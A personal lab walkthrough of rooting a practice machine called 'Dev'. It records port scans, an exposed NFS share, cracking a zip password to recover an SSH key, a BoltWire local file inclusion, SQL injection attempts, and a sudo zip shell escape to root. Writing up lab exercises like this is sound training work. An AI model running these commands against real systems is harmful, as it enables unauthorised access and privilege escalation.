## Box: [DEV] — Started: 2025-10-29 22:10

**IP/Host:** `MAC: 00:0C:29:23:BF:A8`  |  **Status:** `pwned`

*Session IPs*: 
1. 192.168.109.136
## TL;DR

Initial: `how in`. PrivEsc: `how root`.


### Exploit Lifecycle

1. *Validation & Recon*: Vulnlab
2. *Enumeration & Scanning*:
- nmap -sV 192.168.109.136  
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 22:47 EDT
Nmap scan report for 192.168.109.136
Host is up (0.000069s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3-4 (RPC #100003)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:23:BF:A8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

- Port 80 and 8080 - webapp

```bash
# port 80
┌──(l1ch㉿kali)-[~]
└─$ gobuster dir -u http://192.168.109.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.136
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/public               (Status: 301) [Size: 319] [--> http://192.168.109.136/public/]
/src                  (Status: 301) [Size: 316] [--> http://192.168.109.136/src/]
/app                  (Status: 301) [Size: 316] [--> http://192.168.109.136/app/]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.109.136/vendor/]
/extensions           (Status: 301) [Size: 323] [--> http://192.168.109.136/extensions/]
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
                  
```

```bash
# port 8080
┌──(l1ch㉿kali)-[~]
└─$ gobuster dir -u http://192.168.109.136:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.136:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 323] [--> http://192.168.109.136:8080/dev/]
/server-status        (Status: 403) [Size: 282]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

`http://192.168.109.136:8080/dev` is only a single result, let's see `ffuf` do some work:

Best hit so far:
```bash
{
            "input": {
                "FFUFHASH": "34dae208",
                "FUZZ": "pages"
            },
            "position": 520,
            "status": 301,
            "length": 329,
            "words": 20,
            "lines": 10,
            "content-type": "text/html; charset=iso-8859-1",
            "redirectlocation": "http://192.168.109.136:8080/dev/pages/",
            "scraper": {},
            "duration": 341914,
            "resultfile": "",
            "url": "http://192.168.109.136:8080/dev/pages",
            "host": "192.168.109.136:8080"
        },
```


#### Branch 3 - Walkthrough assisted

This was taking long enough that I decided to check the walkthrough. The way the instructor went through the walkthrough was by:

1. Checking the NTFS file mount with `showmount`:
```bash
$ showmount -e 192.168.109.136                              
Export list for 192.168.109.136:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
``` 

2. mounting it:
```bash
$ mount -t nfs 192.168.109.136:/srv/nfs /mnt/tmpmnt/dev 
```

3. Checking the mount:
```bash
┌──(l1ch㉿kali)-[~]
└─$ cd /mnt/tmpmnt/dev 
                                                                                                                                      
┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
└─$ ls
save.zip
```

4. Attacking the `.zip` file:
```bash
┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
└─$ cp save.zip /tmp && cd /tmp

┌──(l1ch㉿kali)-[/tmp]
└─$ unzip save.zip 
Archive:  save.zip
[save.zip] id_rsa password:  

┌──(l1ch㉿kali)-[/tmp]
└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101

┌──(l1ch㉿kali)-[/tmp]
└─$ unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password: [ENTERED PASSWORD HERE]
  inflating: id_rsa                  
  inflating: todo.txt 
  
┌──(l1ch㉿kali)-[/tmp]
└─$ cat todo.txt               
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```

5. Trying JP as the uname for an ssh attempt:
```bash
┌──(l1ch㉿kali)-[/tmp]
└─$ ssh -i id_rsa jp@192.168.109.136                                           
jp@192.168.109.136's password: 

```

6. Using a local file inclusion attack to find username:
```bash
┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
└─$ searchsploit boltwire       
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                         | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                | php/webapps/48411.txt

```

retrieving the /etc/passwd:
![[Pasted image 20251109161747.png]]

![[Pasted image 20251109161840.png]]

7. using that to SSH in as jeanpaul (presumably `jp`):

```bash
┌──(l1ch㉿kali)-[/tmp]
└─$ ssh -i id_rsa jeanpaul@192.168.109.136
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ ls
jeanpaul@dev:~$ ls -lah
total 28K
drwxr-xr-x 3 jeanpaul jeanpaul 4.0K Jun  2  2021 .
drwxr-xr-x 3 root     root     4.0K Jun  1  2021 ..
-rw------- 1 jeanpaul jeanpaul   39 Jun 28  2021 .bash_history
-rw-r--r-- 1 jeanpaul jeanpaul  220 Jun  1  2021 .bash_logout
-rw-r--r-- 1 jeanpaul jeanpaul 3.5K Jun  1  2021 .bashrc
-rw-r--r-- 1 jeanpaul jeanpaul  807 Jun  1  2021 .profile
drwx------ 2 jeanpaul jeanpaul 4.0K Jun  2  2021 .ssh
jeanpaul@dev:~$ history

```

8. Finding the passwordless root commands with `sudo -l`:
```bash
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```

9. Using [[GTFO Bins]] to privesc using the unprotected zip command:
```bash
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# ls
# pwd
/home/jeanpaul
# whoami
root
# cd /root
# ls
flag.txt
# cat flag.txt
Congratz on rooting this box !
# exit
test of /tmp/tmp.y4NU6atD7j OK

```

## Tried and failed branches:

#### *Branch 1, File upload attempt*:

Enumeration has revealed several documents suggesting this is a php server:
![[Pasted image 20251030000523.png|500]]



also likely using SQL for the backend DB (SQLi access attempts failed so far: `admin' -- ` and `admin' AND '1=1' -- ` were both tried)

However, this page suggests that I may be able to plant a file directly into the webroot folder:
![[Pasted image 20251030000439.png|500]]

there is a file that suggests that requirements-checker.php is included no matter what:

![[Pasted image 20251030000624.png|500]]

So I wonder if I can upload a file with the open NFS port. If so then I may also be able to upload a reverse shell script

##### --- I was not able to connect to NFS share ---


#### *Branch 2, trying to exploit a service directly with Metasploit*


```bash
┌──(l1ch㉿kali)-[~]
└─$ nmap -sV -sC -p 22,80,111,2049,8080 192.168.109.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 21:25 EDT
Nmap scan report for 192.168.109.136
Host is up (0.00022s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41707/tcp6  mountd
|   100005  1,2,3      45543/tcp   mountd
|   100005  1,2,3      48627/udp   mountd
|   100005  1,2,3      56296/udp6  mountd
|   100021  1,3,4      35731/tcp6  nlockmgr
|   100021  1,3,4      38009/tcp   nlockmgr
|   100021  1,3,4      38434/udp   nlockmgr
|   100021  1,3,4      56291/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
MAC Address: 00:0C:29:23:BF:A8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds

```

Looking online, PHP 7.3.27 has at least one RCE vulnerability available. Let's dig into that a bit more:

```bash
msf > search exploit php 7.3 rce

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/linux/http/ibm_qradar_unauth_rce                 2018-05-28       excellent  Yes    IBM QRadar SIEM Unauthenticated Remote Code Execution
   1   exploit/linux/http/nagios_xi_snmptrap_authenticated_rce  2020-10-20       excellent  Yes    Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection
   2     \_ target: Linux (x86/x64)                             .                .          .      .
   3     \_ target: CMD                                         .                .          .      .
   4   exploit/linux/http/nagios_xi_mibs_authenticated_rce      2020-10-20       excellent  Yes    Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection
   5     \_ target: Linux (x86/x64)                             .                .          .      .
   6     \_ target: CMD                                         .                .          .      .
   7   exploit/multi/http/open_web_analytics_rce                2022-03-18       excellent  Yes    Open Web Analytics 1.7.3 - Remote Code Execution (RCE)
   8   exploit/multi/http/php_fpm_rce                           2019-10-22       normal     Yes    PHP-FPM Underflow RCE
   9     \_ target: PHP                                         .                .          .      .
   10    \_ target: Shell Command                               .                .          .      .


Interact with a module by name or index. For example info 10, use 10 or use exploit/multi/http/php_fpm_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Shell Command'

msf > 

```

Let's whittle this down some, looking at the php headers:

```bash
┌──(l1ch㉿kali)-[~]
└─$ curl -s -D - http://192.168.109.136:8080/ -o /dev/null
HTTP/1.1 200 OK
Date: Fri, 31 Oct 2025 01:42:15 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Nothing there, let's check Nikto for port 8080:

```bash
nikto -h http://192.168.109.136:8080
```

--- ...I could have enumerated TARGET:8080/dev with gobuster `-_-` ---

#### Branch 3

Which leads to this page:
![[Pasted image 20251031003646.png|500]]

![[Pasted image 20251031003709.png|500]]

![[Pasted image 20251031003731.png|500]]

*We have admin*

From here we can pivot. Navigating to `site > Actions`:
![[Pasted image 20251031004249.png]]

Then `uploads`:

![[Pasted image 20251031004327.png|500]]

then remove `action=source`:

![[Pasted image 20251031004445.png|500]]

we can upload a reverse shell:

![[Pasted image 20251031004642.png|500]]

doesn't execute:

![[Pasted image 20251031004900.png|500]]

Let's try a different way to get a shell. 


Before we can do that I need to give myself editing permissions by the looks of it. See this page:

![[Pasted image 20251031005501.png|500]]



I think I can get code permissions by adding myself to the "editor" group:


![[Pasted image 20251031005142.png]]


Looks like this was done already:

![[Pasted image 20251031005641.png|500]]


Let's try adding a reverse shell here:

![[Pasted image 20251109144534.png]]


These didn't work, so far